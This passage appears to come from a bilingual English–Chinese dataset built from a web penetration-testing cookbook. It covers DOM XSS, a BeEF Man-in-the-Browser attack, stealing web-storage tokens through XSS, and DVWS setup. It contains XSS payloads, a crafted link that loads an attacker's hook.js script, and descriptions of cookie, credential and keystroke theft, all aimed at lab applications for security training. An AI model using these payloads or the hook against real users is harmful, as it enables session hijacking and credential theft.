  zh: 带有数字1的箭头表示存在某些输入验证，但它依赖于一个名为`gUseJavaScriptValidation`的变量的值。如果我们在代码中查找这个变量，会发现它最初被声明为`FALSE`（第1027行），而且似乎没有地方修改它的值，所以也许这个条件永远不会为真。我们跟踪代码流程，发现没有其他验证或修改存储键值的变量。而在**2**，第1093行，这个值作为参数传递给`setMessage`函数，该函数在第1060行**3**通过使用现有元素的`innerHTML`属性将消息添加到页面中。
- en: 'So, let''s try setting a key value that includes HTML code. Add a new entry
    with the following as the key: `Cookbook test <H1>3</H1>`'
  id: totrans-116
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 所以，尝试设置一个包含HTML代码的键值。添加一个新的条目，使用以下作为键：`Cookbook test <H1>3</H1>`
- en: '![](assets/5f6ebb6d-77b2-42a7-b72d-e5b11def40ca.png)'
  id: totrans-117
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/5f6ebb6d-77b2-42a7-b72d-e5b11def40ca.png)'
- en: 'If the HTML code is interpreted by the browser, it is very likely that a JavaScript
    block also would be. Add a new entry with the following as the key: `Cookbook
    test <img src=X onerror="alert(''DOM XSS'')">`'
  id: totrans-118
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果HTML代码被浏览器解析，那么一个JavaScript块也很可能被解析。添加一个新的条目，使用以下作为键：`Cookbook test <img src=X
    onerror="alert('DOM XSS')">`
- en: '![](assets/21f4321c-4f1b-4536-acd2-45264a823f22.png)'
  id: totrans-119
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/21f4321c-4f1b-4536-acd2-45264a823f22.png)'
- en: How it works...
  id: totrans-120
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的……
- en: In this recipe, we first analyzed the behavior of the application, noticing
    that it didn't connect to the server to add information to the page and that it
    reflected a value given by the user. Later, we analyzed the script code that adds
    the data to the browser's internal storage, and noticed that such data may not
    be properly validated and presented back to the user via the `innerHTML` property,
    at least for the key value, which implies that the data is treated as HTML code,
    not as text.
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 在本示例中，我们首先分析了应用程序的行为，注意到它没有连接到服务器来向页面添加信息，并且它反射了用户提供的一个值。随后，我们分析了将数据添加到浏览器内部存储的脚本代码，发现这些数据可能没有经过正确的验证，并通过
    `innerHTML` 属性返回给用户，至少对于键值来说，这意味着这些数据被当作 HTML 代码处理，而不是文本。
- en: To try this lack of validation, we first inserted some text with HTML header
    tags and got the code interpreted by the browser. Our last step was to attempt
    an XSS proof of concept that was successful.
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 为了尝试这个验证不足的问题，我们首先插入了一些带有 HTML 头部标签的文本，并让浏览器解释了这些代码。我们的最后一步是尝试一个 XSS 漏洞概念验证，并成功执行了。
- en: Man-in-the-Browser attack with XSS and BeEF
  id: totrans-123
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 浏览器劫持攻击与 XSS 和 BeEF 的结合
- en: BeEF, the Browser Exploitation Framework, is a tool that focuses on client-side
    vectors, specifically on attacking web browsers.
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: BeEF（浏览器利用框架）是一个专注于客户端攻击向量的工具，特别是针对网页浏览器的攻击。
- en: In this recipe, we will exploit an XSS vulnerability and use BeEF to take control
    of the client browser.
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: 在本示例中，我们将利用 XSS 漏洞并使用 BeEF 控制客户端浏览器。
- en: Getting ready
  id: totrans-126
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 准备工作
- en: Before we start, we need to be sure that we have started the BeEF service and
    are capable of accessing `http://127.0.0.1:3000/ui/panel` (with `beef`/`beef`
    as login credentials).
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们开始之前，需要确保已经启动了 BeEF 服务，并且能够访问 `http://127.0.0.1:3000/ui/panel`（登录凭证为 `beef`/`beef`）。
- en: 'The default BeEF service in Kali Linux doesn''t work, so we cannot simply run
    `beef-xss` to get BeEF running. Instead, we need to run it from the directory
    in which it was installed, as shown here:'
  id: totrans-128
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Kali Linux 中的默认 BeEF 服务无法正常工作，因此我们不能仅仅运行 `beef-xss` 来启动 BeEF。相反，我们需要从安装目录中运行它，如下所示：
- en: '[PRE7]'
  id: totrans-129
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: '![](assets/cfd25498-a677-4024-a496-e016a6690db1.png)'
  id: totrans-130
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/cfd25498-a677-4024-a496-e016a6690db1.png)'
- en: Now, browse to `http://127.0.0.1:3000/ui/panel` and use `beef` as both the username
    and password. If that works, we are ready to continue.
  id: totrans-131
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，浏览到 `http://127.0.0.1:3000/ui/panel`，并使用 `beef` 作为用户名和密码。如果成功，我们就可以继续。
- en: How to do it...
  id: totrans-132
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何操作...
- en: 'BeEF needs the client browser to call the `hook.js` file, which is the one
    that hooks the browser to our BeEF server and we will use an application vulnerable
    to XSS to make the user call it:'
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: BeEF 需要客户端浏览器调用 `hook.js` 文件，这是一个将浏览器钩住并连接到 BeEF 服务器的脚本，我们将使用一个易受 XSS 攻击的应用程序让用户调用此脚本：
- en: Imagine that you are the victim; you have received an email containing a link
    to `http://192.168.56.11/bodgeit/search.jsp?q=<script src="http://192.168.56.10:3000/hook.js"></script>`
    and you browse to that link.
  id: totrans-134
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 假设你是受害者，你收到了一封包含链接 `http://192.168.56.11/bodgeit/search.jsp?q=<script src="http://192.168.56.10:3000/hook.js"></script>`
    的邮件，并且点击了该链接。
- en: 'Now, in the BeEF panel, the attacker will see a new online browser:'
  id: totrans-135
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，在 BeEF 面板中，攻击者将看到一个新的在线浏览器：
- en: '![](assets/60862e74-52d6-4dbf-afa1-2ce01c5eaf0e.png)'
  id: totrans-136
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/60862e74-52d6-4dbf-afa1-2ce01c5eaf0e.png)'
- en: 'If we check the Logs tab in the browser, we may see that BeEF is storing information
    about the actions the user is performing in the browser''s window, such as typing
    and clicking, as we can see here:'
  id: totrans-137
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果我们查看浏览器中的日志标签页，可能会看到 BeEF 正在存储用户在浏览器窗口中执行的操作信息，例如输入和点击，如下所示：
- en: '![](assets/4e6e0c5a-d0c8-47d4-9dea-9afac2a1d37d.png)'
  id: totrans-138
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/4e6e0c5a-d0c8-47d4-9dea-9afac2a1d37d.png)'
- en: The best thing for the attacker to do after a browser is hooked is to generate
    some persistence, at least while the user is navigating in the compromised domain.
    Go to the Commands tab in the attacker's browser and, from there in the Module
    Tree, go to Persistence | Man-In-The-Browser and then click on Execute.
  id: totrans-139
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 当浏览器被劫持后，攻击者做的最好的事情就是生成一些持久化，至少在用户浏览被攻陷的域时保持有效。前往攻击者浏览器中的 Commands 标签页，然后在模块树中选择
    Persistence | Man-In-The-Browser，接着点击 Execute 执行。
- en: 'After the module executes, select the relevant command in Module Results History
    to check the results shown as follows:'
  id: totrans-140
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 模块执行后，选择相关的命令并查看模块结果历史中的结果，如下所示：
- en: '![](assets/f4608bc6-77bb-4e28-ae10-ce45bc7d9f8e.png)'
  id: totrans-141
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/f4608bc6-77bb-4e28-ae10-ce45bc7d9f8e.png)'
- en: 'The attacker can also use BeEF to execute commands in the victim browser; for
    example, in the Module Tree go to Browser | Get Cookie and click Execute to get
    the user''s cookie:'
  id: totrans-142
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 攻击者还可以使用 BeEF 在受害者的浏览器中执行命令；例如，在模块树中进入浏览器 | 获取 Cookie，点击执行以获取用户的 Cookie：
- en: '![](assets/112c359a-9ac0-4e5f-b727-b988aa1b6283.png)'
  id: totrans-143
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/112c359a-9ac0-4e5f-b727-b988aa1b6283.png)'
- en: How it works...
  id: totrans-144
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的…
- en: In this recipe, we used the `src` property of the `script` tag to call an external
    JavaScript file; in this case, the hook to our BeEF server.
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个配方中，我们使用了 `script` 标签的 `src` 属性来调用一个外部的 JavaScript 文件；在这个例子中，是我们 BeEF 服务器的钩子。
- en: This `hook.js` file communicates with the server, executes the commands, and
    returns the responses so that the attacker can see them; it prints nothing in
    the client's browser so the victim will generally never know that his or her browser
    has been compromised.
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: 这个 `hook.js` 文件与服务器通信，执行命令并返回响应，以便攻击者能够查看；它不会在客户端浏览器中输出任何内容，因此受害者通常不会知道他们的浏览器已经被入侵。
- en: After making the victim execute our hook script, we used the persistence module
    Man-in-the-Browser to make the browser execute an AJAX request every time the
    user clicks a link to the same domain, so that this request keeps the hook and
    also loads the new page.
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 在让受害者执行我们的钩子脚本后，我们使用了持久性模块“浏览器中间人”（Man-in-the-Browser），使浏览器每次用户点击指向相同域名的链接时，都会执行一个
    AJAX 请求，从而保持钩子的执行并加载新页面。
- en: We also saw that BeEF's log keeps a record of every action the user performs
    on the page, and we were able to obtain a username and password from this. It
    was also possible to obtain the session cookie remotely, which could have allowed
    an attacker to hijack the victim's session.
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还发现，BeEF 的日志记录了用户在页面上执行的每一个操作，并通过这些记录我们能够获取用户名和密码。还可以远程获取会话 Cookie，这可能使攻击者劫持受害者的会话。
- en: 'The colored circle to the left of the module indicates the availability and
    visibility of the module: green means that the module works for the victim browser
    and should not be visible to the user, orange says that it will work but the user
    will notice it or will have to interact with it, gray means that it hasn''t been
    tested in that browser, and red means that the module does not work against the
    hooked browser.'
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: 模块左侧的彩色圆圈表示模块的可用性和可见性：绿色表示该模块对受害者浏览器有效，且对用户不可见，橙色表示它会有效，但用户会注意到它或必须与之交互，灰色表示该浏览器未经过测试，红色表示该模块无法在被钩取的浏览器上运行。
- en: There's more...
  id: totrans-150
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 还有更多…
- en: 'BeEF has an incredible amount of functionality, from ascertaining the type
    of browser the victim is using, to the exploitation of known vulnerabilities and
    the complete compromise of the client system. Some of the most interesting features
    are as follows:'
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
  zh: BeEF 具有非常强大的功能，从确定受害者使用的浏览器类型，到利用已知漏洞，甚至完全控制客户端系统。以下是一些最有趣的功能：
- en: '**Social Engineering—Pretty Theft**: This is a social engineering tool that
    allows us to simulate a login popup resembling common services such as Facebook,
    LinkedIn, YouTube, and others.'
  id: totrans-152
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**社会工程学—漂亮的盗窃**：这是一个社会工程学工具，允许我们模拟一个登录弹窗，外观类似于常见的服务，如 Facebook、LinkedIn、YouTube
    等。'
- en: '**Browser—webcam and browser—webcam HTML5**: As obvious as it might seem, these
    two modules are able to abuse a permissive configuration to activate the victim''s
    webcam. The first uses a hidden flash embed and the second uses HTML5.'
  id: totrans-153
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**浏览器—网络摄像头和浏览器—网络摄像头 HTML5**：看似显而易见，这两个模块能够利用宽松的配置来激活受害者的网络摄像头。第一个使用隐藏的 Flash
    嵌入，第二个使用 HTML5。'
- en: '**Exploits folder**: This contains a collection of exploits for specific software
    and situations; some of them exploit servers and others the client''s browser.'
  id: totrans-154
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**漏洞利用文件夹**：该文件夹包含了针对特定软件和情况的漏洞利用集合；其中一些利用了服务器漏洞，另一些则是针对客户端浏览器的。'
- en: '**Browser—hooked domain/get stored credentials**: This attempts to extract
    the username and passwords for the compromised domains stored in the browser.'
  id: totrans-155
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**浏览器—钩取域名/获取存储的凭证**：该模块尝试提取受感染域名的用户名和密码，这些凭证存储在浏览器中。'
- en: '**Use as proxy**: If we right-click on a hooked browser, we get the option
    to use it as a proxy, which makes the client''s browser a web proxy; this may
    give us the chance to explore our victim''s internal network.'
  id: totrans-156
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**用作代理**：如果我们右击一个钩取的浏览器，我们可以选择将其作为代理使用，这会使客户端的浏览器变成一个 Web 代理；这可能让我们有机会探索受害者的内部网络。'
- en: There are many other attacks and modules in BeEF that are useful to a penetration
    tester; if you want to learn more, you can check out the official wiki at [https://github.com/beefproject/beef/wiki](https://github.com/beefproject/beef/wiki).
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: BeEF中有许多其他对渗透测试员有用的攻击和模块；如果你想了解更多，可以查看[https://github.com/beefproject/beef/wiki](https://github.com/beefproject/beef/wiki)上的官方wiki。
- en: Extracting information from web storage
  id: totrans-158
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 从网页存储中提取信息
- en: Prior to HTML5, the only way a web application could store information persistently
    or on a session basis in a user's computer was through cookies. In this new version
    of the language, new storage options, called **web storage**, are added, namely
    local storage and session storage. These allow an application to store and retrieve
    information from a client (browser) using JavaScript, and this information is
    kept until explicitly deleted, in the case of local storage, or in the case of
    session storage, until the tab or window that saved it is closed.
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: 在HTML5之前，Web应用程序只能通过Cookies将信息持久存储或在用户计算机上以会话为基础进行存储。在HTML5中，新增了名为**web storage**的存储选项，包括本地存储和会话存储。这些选项允许应用程序使用JavaScript在客户端（浏览器）存储和检索信息，且这些信息会一直保留，直到显式删除（对于本地存储而言），或者直到保存该信息的标签页或窗口关闭（对于会话存储而言）。
- en: In this recipe, we will use XSS vulnerabilities to retrieve information from
    the browser's web storage, showing that this information can be easily exfiltrated
    by an attacker if an application is vulnerable.
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个案例中，我们将利用XSS漏洞从浏览器的网页存储中提取信息，展示如果一个应用存在漏洞，攻击者可以轻松地窃取这些信息。
- en: How to do it...
  id: totrans-161
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何操作...
- en: 'We will use Mutillidae II and its HTML5 web storage exercise again for this
    recipe. Here are the steps:'
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将再次使用Mutillidae II及其HTML5网页存储练习来完成这个案例。以下是步骤：
- en: In the Kali VM, browse to Mutillidae II (`http://192.168.56.11/mutillidae`)
    and in the menu, go to HTML5 | HTML 5 Web Storage | HTML 5 Web Storage.
  id: totrans-163
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在Kali虚拟机中，访问Mutillidae II（`http://192.168.56.11/mutillidae`），在菜单中选择HTML5 | HTML
    5 Web Storage | HTML 5 Web Storage。
- en: 'Open Developer Tools and go to the Storage tab. Then, go to `Local Storage`
    and select the server address (`192.168.56.11`):'
  id: totrans-164
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 打开开发者工具并转到存储标签页。然后，进入`Local Storage`并选择服务器地址（`192.168.56.11`）：
- en: '![](assets/e515ef8f-6824-41c6-bd4b-8bae58f3fa35.png)'
  id: totrans-165
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/e515ef8f-6824-41c6-bd4b-8bae58f3fa35.png)'
- en: Here, we can see that there are three values in Local Storage.
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里，我们可以看到本地存储中有三个值。
- en: 'Now, change to `Session Storage` and select the server address:'
  id: totrans-167
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，切换到`Session Storage`并选择服务器地址：
- en: '![](assets/2028eff7-f0fe-4f97-89ef-964721be6dd3.png)'
  id: totrans-168
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/2028eff7-f0fe-4f97-89ef-964721be6dd3.png)'
- en: In the temporary or per-session storage, we see four values, among them one
    called `Secure.AuthenticationToken`.
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: 在临时或每会话存储中，我们看到四个值，其中一个名为`Secure.AuthenticationToken`。
- en: We mentioned before that `Local Storage` is accessible on a per-domain basis,
    which means that any application running in the same domain can read and manipulate,
    for example, the `MessageOfTheDay` entry we saw in *step 2*. Let's try and exploit
    a vulnerability in another application to access this data. On the same browser,
    open a new tab and go to BodgeIt (`http://192.168.56.11/bodgeit`).
  id: totrans-170
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们之前提到过，`Local Storage`是按域名访问的，这意味着任何在同一域名下运行的应用程序都可以读取和操作，例如我们在*步骤2*中看到的`MessageOfTheDay`条目。现在我们尝试利用另一个应用程序中的漏洞来访问这些数据。在同一浏览器中，打开一个新标签页并访问BodgeIt（`http://192.168.56.11/bodgeit`）。
- en: 'We know BodgeIt''s search is vulnerable to XSS, so enter the following payload
    in the search box and execute it:'
  id: totrans-171
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们知道BodgeIt的搜索功能存在XSS漏洞，因此在搜索框中输入以下有效载荷并执行：
- en: '[PRE8]'
  id: totrans-172
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: '![](assets/94d95b99-c013-40c7-af0a-caca4d5fe565.png)'
  id: totrans-173
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/94d95b99-c013-40c7-af0a-caca4d5fe565.png)'
- en: 'Now, try the same with the `Session Storage`:'
  id: totrans-174
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，尝试在`Session Storage`中执行相同的操作：
- en: '[PRE9]'
  id: totrans-175
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: As we cannot access the `Session Storage` from a different window, go back to
    the Mutillidae II tab and go to Owasp 2013 | XSS | Reflected First Order | DNS
    lookup.
  id: totrans-176
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 由于我们无法从不同的窗口访问`Session Storage`，请返回到Mutillidae II标签页并转到Owasp 2013 | XSS | Reflected
    First Order | DNS查找。
- en: 'In the Hostname/IP field, enter the preceding payload and click on Lookup DNS:'
  id: totrans-177
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在Hostname/IP字段中，输入前面的有效载荷并点击查找DNS：
- en: '![](assets/855c03fa-8cd7-4aa5-9394-d9007c74d513.png)'
  id: totrans-178
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/855c03fa-8cd7-4aa5-9394-d9007c74d513.png)'
- en: How it works...
  id: totrans-179
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 工作原理...
- en: In this recipe, we saw how we can use the browser's Developer Tools to view
    and edit the contents of the browser's storage. We verified the differences in
    accessibility between `Local Storage` and `Session Storage`, and how an XSS vulnerability
    can expose all stored information to an attacker.
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个案例中，我们演示了如何使用浏览器的开发者工具查看和编辑浏览器存储的内容。我们验证了`Local Storage`和`Session Storage`之间的访问性差异，以及XSS漏洞如何将所有存储的信息暴露给攻击者。
- en: 'First, we accessed `Local Storage` from an application different from the one
    that added the storage, but in the same domain. To do that, we used `window.localStorage.MessageOfTheDay`,
    taking the key value as the object name and referencing it directly as a member
    of `Local Storage`. For the `Session Storage`, we had to move to the window that
    created the storage and exploit a vulnerability there; here, we used a different
    instruction to get the value we wanted: `window.sessionStorage.getItem("Secure.AuthenticationToken"`.
    Both forms (key as a member of the class and `getItem`) are valid for both types
    of storage. We used `getItem` in the session because the key includes a period
    (`.`), and this would be processed as an object/property delimiter by the JavaScript
    interpreter, so we needed to use `getItem` to enclose it in colons.'
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们从一个与存储添加者不同的应用中访问 `Local Storage`，但它位于相同的域中。为此，我们使用了 `window.localStorage.MessageOfTheDay`，将键值作为对象名称，并直接引用它作为
    `Local Storage` 的成员。对于 `Session Storage`，我们需要转到创建存储的窗口，并在那里利用一个漏洞；在这里，我们使用了一个不同的指令来获取我们想要的值：`window.sessionStorage.getItem("Secure.AuthenticationToken"）。这两种形式（将键作为类的成员和使用
    `getItem`）对于两种存储类型都是有效的。在 session 中我们使用 `getItem`，因为键包含一个句点（`.`），这会被 JavaScript
    解释器处理为对象/属性分隔符，所以我们需要使用 `getItem` 将其用冒号括起来。
- en: There's more...
  id: totrans-182
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 还有更多...
- en: If an application uses web storage to keep sensitive information about users,
    XSS shouldn't be the only security concern. If an attacker has access to the user's
    computer, this attacker can directly access the files where `Local Storage` is
    kept, as browsers save this information in clear text in local database files.
    It's left to the reader to investigate where these files are stored by different
    browsers and in different operating systems, and how to read them.
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: 如果一个应用使用 web 存储来保存关于用户的敏感信息，XSS 不应该是唯一的安全隐患。如果攻击者能够访问用户的计算机，那么攻击者就可以直接访问存储 `Local
    Storage` 的文件，因为浏览器将这些信息以明文形式保存在本地数据库文件中。具体这些文件在哪些浏览器和操作系统中存储，以及如何读取它们，留给读者自行探索。
- en: Testing WebSockets with ZAP
  id: totrans-184
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用 ZAP 测试 WebSockets
- en: As HTTP is a stateless protocol, it treats every request as unique and unrelated
    to the previous and next ones, which is why applications need to implement mechanisms
    such as session cookies to manage the operations performed by a single user in
    a session. As an alternative to overcome this limitation, HTML5 incorporates WebSockets.
    WebSockets provide a persistent, bidirectional communication channel between client
    and server over the HTTP protocol.
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 由于 HTTP 是一种无状态协议，它将每个请求视为独立的，并与前一个和下一个请求无关，这也是为什么应用需要实现诸如会话 cookies 这样的机制来管理单个用户在一个会话中的操作。为了克服这一局限性，HTML5
    引入了 WebSockets。WebSockets 提供了一个持久的、双向的通信通道，使客户端和服务器可以通过 HTTP 协议进行通信。
- en: In this recipe, we will show how to use OWASP ZAP to monitor, intercept, and
    modify WebSockets communication as we do with normal requests during penetration
    testing.
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: 在本教程中，我们将展示如何使用 OWASP ZAP 监控、拦截并修改 WebSockets 通信，就像我们在渗透测试中处理普通请求一样。
- en: Getting ready
  id: totrans-187
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 准备工作
- en: OWASP BWA doesn't yet include an application that uses WebSockets, so we will
    need to use **Damn Vulnerable Web Sockets** (**DVWS**) ([https://www.owasp.org/index.php/OWASP_Damn_Vulnerable_Web_Sockets_(DVWS)](https://www.owasp.org/index.php/OWASP_Damn_Vulnerable_Web_Sockets_(DVWS))),
    also from OWASP, for this recipe.
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: OWASP BWA 目前没有包含一个使用 WebSockets 的应用，所以我们需要使用 **Damn Vulnerable Web Sockets**
    (**DVWS**) （[https://www.owasp.org/index.php/OWASP_Damn_Vulnerable_Web_Sockets_(DVWS)](https://www.owasp.org/index.php/OWASP_Damn_Vulnerable_Web_Sockets_(DVWS))），这是
    OWASP 提供的另一个工具，用于本教程。
- en: 'DVWS is a PHP-based open source application; download it into your Kali VM
    from its GitHub repository: [https://github.com/interference-security/DVWS/](https://github.com/interference-security/DVWS/).'
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: DVWS 是一个基于 PHP 的开源应用；你可以从其 GitHub 仓库下载到 Kali 虚拟机中：[https://github.com/interference-security/DVWS/](https://github.com/interference-security/DVWS/)。
- en: In ideal conditions, we would only need to download the application, copy it
    to the Apache root directory, and start the services to have it running, but unfortunately
    for us, this is not the case in Kali Linux.
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 在理想的条件下，我们只需要下载应用，将其复制到 Apache 根目录，并启动服务即可运行，但不幸的是，这在 Kali Linux 中并非如此。
- en: 'First, you need to install the `php-mysqli` package using `apt install php-mysqli`.
    Pay attention to the PHP version it is for; in our case it is for 7.2\. Check
    PHP versions in Apache `config` files and adjust accordingly. Be sure that the
    correct versions of the PHP modules are in `/etc/apache2/mods-enabled/`; if they
    are not, copy the right ones from `/etc/apache2/mods-available/` and remove the
    unnecessary ones:'
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，你需要使用 `apt install php-mysqli` 安装 `php-mysqli` 包。注意它适用于哪个 PHP 版本；在我们这里是 7.2
    版本。检查 Apache 配置文件中的 PHP 版本，并相应地调整。确保 PHP 模块的正确版本存在于 `/etc/apache2/mods-enabled/`
    中；如果没有，应该从 `/etc/apache2/mods-available/` 中复制正确的版本，并删除不必要的模块：
- en: '![](assets/e3dea5d3-dc52-407c-bc75-be31ca4bfcc3.png)'
  id: totrans-192
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/e3dea5d3-dc52-407c-bc75-be31ca4bfcc3.png)'
- en: Also, check that the MySQL module is enabled in `php.ini` (`/etc/php/<php_version>/apache2/php.ini`).
    Look for the `Dynamic Extensions` section and enable (remove the preceding `;`)
    the `extension=mysqli` line.
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: 另外，检查 `php.ini`（`/etc/php/<php_version>/apache2/php.ini`）中是否启用了 MySQL 模块。查找
    `Dynamic Extensions` 部分，并启用（去掉前面的 `;`）`extension=mysqli` 行。
- en: 'Next, configure the database. First, start the MySQL service (`service mysql
    start`) and then the MySQL client (`mysql`) from the Terminal. Once in the MySQL
    prompt, create the DVWS database with `create database dvws_db;` and exit MySQL.
    When the database is created, we need to create its table structure. DVWS includes
    a script to do that, so execute the following in a Terminal: `mysql dvws_db <
    /var/www/html/DVWS/includes/dvws_db.sql` (assuming `/var/www/html/` is Apache''s
    document root directory):'
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，配置数据库。首先，从终端启动 MySQL 服务（`service mysql start`），然后启动 MySQL 客户端（`mysql`）。进入
    MySQL 提示符后，使用 `create database dvws_db;` 创建 DVWS 数据库，并退出 MySQL。当数据库创建完成后，我们需要创建其表结构。DVWS
    提供了一个脚本来完成此操作，所以在终端中执行以下命令：`mysql dvws_db < /var/www/html/DVWS/includes/dvws_db.sql`（假设
    `/var/www/html/` 是 Apache 的文档根目录）：
- en: '![](assets/4ffb91d5-562d-43d8-9541-2e114f775b87.png)'
  id: totrans-195
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/4ffb91d5-562d-43d8-9541-2e114f775b87.png)'
- en: As DVWS uses a predefined hostname, we need to fix a name resolution for that
    name to our local address, which is the one we will be using to test. Open `/etc/hosts`
    with your favorite text editor and add the line `127.0.0.1 dvws.local` to it.
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 由于 DVWS 使用了预定义的主机名，我们需要为该主机名设置一个本地地址解析，这个地址就是我们将用于测试的地址。使用你喜欢的文本编辑器打开 `/etc/hosts`
    文件，并在其中添加 `127.0.0.1 dvws.local` 这一行。
- en: 'Now, we can start our Apache service with `service apache2 start` and browse
    to `http://dvws.local/DVWS/`. Follow the instructions given there, including starting
    the WebSockets listener (`php ws-socket.php`), and run the `setup` script to finish
    configuring the database (`http://dvws.local/DVWS/setup.php`):'
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们可以通过 `service apache2 start` 启动 Apache 服务，并浏览到 `http://dvws.local/DVWS/`。按照页面上的指示操作，包括启动
    WebSockets 监听器（`php ws-socket.php`），并运行 `setup` 脚本来完成数据库配置（`http://dvws.local/DVWS/setup.php`）：
- en: '![](assets/a13ab8e3-7f71-4ca6-a298-5c7b48fed8bb.png)'
  id: totrans-198
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/a13ab8e3-7f71-4ca6-a298-5c7b48fed8bb.png)'
- en: Now, we are ready to continue.
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们可以继续进行。
- en: How to do it...
  id: totrans-200
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何操作…
- en: 'We chose ZAP for this exercise as it can monitor, intercept, and repeat WebSockets
    messages. Burp Suite can monitor WebSockets communication; however, it doesn''t
    have the ability to intercept, modify, and replay messages:'
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: 我们为本次练习选择了 ZAP，因为它可以监视、拦截并重放 WebSockets 消息。Burp Suite 也能监视 WebSockets 通信，但它没有拦截、修改和重放消息的能力：
- en: 'Configure your browser to use ZAP as a proxy, and in ZAP, enable the WebSockets
    tab by clicking on the plus icon in the bottom panel:'
  id: totrans-202
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 配置你的浏览器使用 ZAP 作为代理，在 ZAP 中，通过点击底部面板中的加号图标，启用 WebSockets 标签页。
- en: '![](assets/7c8c42e5-80ba-48df-87db-ec0546770f68.png)'
  id: totrans-203
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/7c8c42e5-80ba-48df-87db-ec0546770f68.png)'
